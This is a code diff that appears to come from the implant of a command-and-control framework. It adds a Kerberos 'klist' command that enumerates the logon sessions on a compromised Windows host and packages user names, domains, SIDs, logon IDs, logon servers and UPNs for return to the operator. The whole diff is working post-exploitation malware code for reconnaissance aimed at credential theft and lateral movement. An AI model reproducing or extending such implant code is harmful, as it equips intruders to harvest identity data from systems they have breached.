@@ -2871,8 +2871,7 @@ VOID Commandkerberos( PPARSER Parser )
     PPACKAGE     Package = NULL;
     PSOCKET_DATA Socket  = NULL;
     DWORD        Command = 0;
-    HANDLE       hToken  = NULL;
-    LUID*        luid    = NULL;
+    HANDLE       hToken  = TokenCurrentHandle();
 
     Package = PackageCreate( DEMON_COMMAND_KERBEROS );
     Command = ParserGetInt32( Parser );
@@ -2882,8 +2881,9 @@ VOID Commandkerberos( PPARSER Parser )
     {
         case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")
         {
-            hToken = TokenCurrentHandle();
-            luid = GetLUID(hToken);
+            LUID*  luid    = NULL;
+
+            luid = GetLUID( hToken );
 
             if ( hToken )
             {
@@ -2901,6 +2901,63 @@ VOID Commandkerberos( PPARSER Parser )
                 MemSet( luid, 0, sizeof( LUID ) );
                 Instance.Win32.LocalFree( luid );
                 luid = NULL;
+            }
+
+            break;
+        }
+
+        case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")
+        {
+            DWORD Type                       = 0;
+            DWORD LuidVal                    = 0;
+            PSESSION_INFORMATION Sessions    = NULL;
+            PSESSION_INFORMATION SessionTmp  = NULL;
+            DWORD                NumSessions = 0;
+            LUID                 luid        = (LUID){.HighPart = 0, .LowPart = 0};
+
+            Type = ParserGetInt32( Parser );
+            // Type 0: /all
+            // Type 1: /luid 0xabc
+            if ( Type == 1 )
+            {
+                luid.LowPart = ParserGetInt32( Parser );
+            }
+
+            Sessions = Klist( hToken, luid );
+
+            PackageAddInt32( Package, Sessions ? TRUE : FALSE );
+
+            for ( NumSessions = 0, SessionTmp = Sessions; SessionTmp; NumSessions++, SessionTmp = SessionTmp->Next ){}
+
+            PackageAddInt32( Package, NumSessions );
+
+            while ( Sessions )
+            {
+                SessionTmp = Sessions->Next;
+
+                PackageAddBytes( Package, Sessions->UserName, StringLengthW( Sessions->UserName ) * 2 );
+                PackageAddBytes( Package, Sessions->Domain, StringLengthW( Sessions->Domain ) * 2 );
+                PackageAddInt32( Package, Sessions->LogonId.LowPart );
+                PackageAddInt32( Package, Sessions->LogonId.HighPart );
+                PackageAddInt32( Package, Sessions->Session );
+                PackageAddBytes( Package, Sessions->UserSID, StringLengthW( Sessions->UserSID ) * 2 );
+                PackageAddInt32( Package, Sessions->LogonTime.LowPart );
+                PackageAddInt32( Package, Sessions->LogonTime.HighPart );
+                PackageAddInt32( Package, Sessions->LogonType );
+                PackageAddBytes( Package, Sessions->AuthenticationPackage, StringLengthW( Sessions->AuthenticationPackage ) * 2 );
+                PackageAddBytes( Package, Sessions->LogonServer, StringLengthW( Sessions->LogonServer ) * 2 );
+                PackageAddBytes( Package, Sessions->LogonServerDNSDomain, StringLengthW( Sessions->LogonServerDNSDomain ) * 2 );
+                PackageAddBytes( Package, Sessions->Upn, StringLengthW( Sessions->Upn ) * 2 );
+
+                MemSet( Sessions, 0, sizeof( SESSION_INFORMATION ) );
+                Instance.Win32.LocalFree( Sessions );
+                Sessions = SessionTmp;
+            }
+
+            if ( hToken )
+            {
+                Instance.Win32.NtClose( hToken );
+                hToken = NULL;
             }
 
             break;
